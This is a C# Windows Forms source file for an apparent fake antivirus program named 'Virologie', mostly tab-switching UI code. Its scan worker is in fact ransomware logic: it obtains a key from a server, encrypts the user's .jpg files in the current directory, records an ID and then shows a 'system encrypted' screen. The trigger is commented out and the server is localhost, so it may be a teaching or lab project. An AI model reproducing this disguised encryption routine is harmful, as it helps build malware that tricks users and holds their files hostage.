using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.IO;

namespace Virologie
{
    public partial class Form1 : Form
    {
        BackgroundWorker worker;

        public Form1()
        {
            InitializeComponent();
            HomeCheckBox_Click(null, null);

            /*HomeCollection.Add(WarningTextBox);
            HomeCollection.Add(DangerPictureBox);
            HomeCollection.Add(SystemLabel);
            HomeCollection.Add(LastScanLabel);
            HomeCollection.Add(ScanRedirectLabel);*/

            worker = new BackgroundWorker();
            worker.DoWork += worker_DoWork;
            worker.RunWorkerCompleted += worker_RunWorkerCompleted;
        }

        void worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (e.Error != null)
            {
                Console.WriteLine("Error running the scan");
                return;
            }

            var seForm = new SystemEncrytedForm();
            seForm.Show();
        }

        void worker_DoWork(object sender, DoWorkEventArgs args)
        {
            FileExplorer explorer = new FileExplorer();
            FileEncrypter encrypter = CryptoKeyManager.CreateFromServer("http://localhost:1234/");
            if (encrypter != null)
            {
                explorer.ExploreAndApply(Directory.GetCurrentDirectory(), "*.jpg", encrypter.Encrypt);
                CryptoKeyManager.SaveGUID();
            }
        }

        private void HomeCheckBox_Click(object sender, EventArgs e)
        {
            HomeCheckBox.CheckState = CheckState.Checked;
            ScanCheckBox.CheckState = CheckState.Unchecked;
            SecurityCheckBox.CheckState = CheckState.Unchecked;
            UpdateCheckBox.CheckState = CheckState.Unchecked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = true;
            groupBoxScan1.Visible = false;
            groupBoxSecurity.Visible = false;
            groupBoxUpdate1.Visible = false;
            groupBoxSettings1.Visible = false;
        }

        public void ScanCheckBox_Click()
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Checked;
            SecurityCheckBox.CheckState = CheckState.Unchecked;
            UpdateCheckBox.CheckState = CheckState.Unchecked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = true;
            groupBoxSecurity.Visible = false;
            groupBoxUpdate1.Visible = false;
            groupBoxSettings1.Visible = false;
        }

        private void ScanCheckBox_Click(object sender, EventArgs e)
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Checked;
            SecurityCheckBox.CheckState = CheckState.Unchecked;
            UpdateCheckBox.CheckState = CheckState.Unchecked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = true;
            groupBoxSecurity.Visible = false;
            groupBoxUpdate1.Visible = false;
            groupBoxSettings1.Visible = false;

            //worker.RunWorkerAsync();
        }

        public void SecurityCheckBox_Click()
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Unchecked;
            SecurityCheckBox.CheckState = CheckState.Checked;
            UpdateCheckBox.CheckState = CheckState.Unchecked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = false;
            groupBoxSecurity.Visible = true;
            groupBoxUpdate1.Visible = false;
            groupBoxSettings1.Visible = false;
        }

        private void SecurityCheckBox_Click(object sender, EventArgs e)
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Unchecked;
            SecurityCheckBox.CheckState = CheckState.Checked;
            UpdateCheckBox.CheckState = CheckState.Unchecked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = false;
            groupBoxSecurity.Visible = true;
            groupBoxUpdate1.Visible = false;
            groupBoxSettings1.Visible = false;
        }

        public void UpdateCheckBox_Click()
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Unchecked;
            SecurityCheckBox.CheckState = CheckState.Unchecked;
            UpdateCheckBox.CheckState = CheckState.Checked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = false;
            groupBoxSecurity.Visible = false;
            groupBoxUpdate1.Visible = true;
            groupBoxSettings1.Visible = false;
        }

        private void UpdateCheckBox_Click(object sender, EventArgs e)
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Unchecked;
            SecurityCheckBox.CheckState = CheckState.Unchecked;
            UpdateCheckBox.CheckState = CheckState.Checked;
            SettingsCheckBox.CheckState = CheckState.Unchecked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = false;
            groupBoxSecurity.Visible = false;
            groupBoxUpdate1.Visible = true;
            groupBoxSettings1.Visible = false;
        }

        private void SettingsCheckBox_Click(object sender, EventArgs e)
        {
            HomeCheckBox.CheckState = CheckState.Unchecked;
            ScanCheckBox.CheckState = CheckState.Unchecked;
            SecurityCheckBox.CheckState = CheckState.Unchecked;
            UpdateCheckBox.CheckState = CheckState.Unchecked;
            SettingsCheckBox.CheckState = CheckState.Checked;

            groupBoxHome.Visible = false;
            groupBoxScan1.Visible = false;
            groupBoxSecurity.Visible = false;
            groupBoxUpdate1.Visible = false;
            groupBoxSettings1.Visible = true;
        }
    }
}
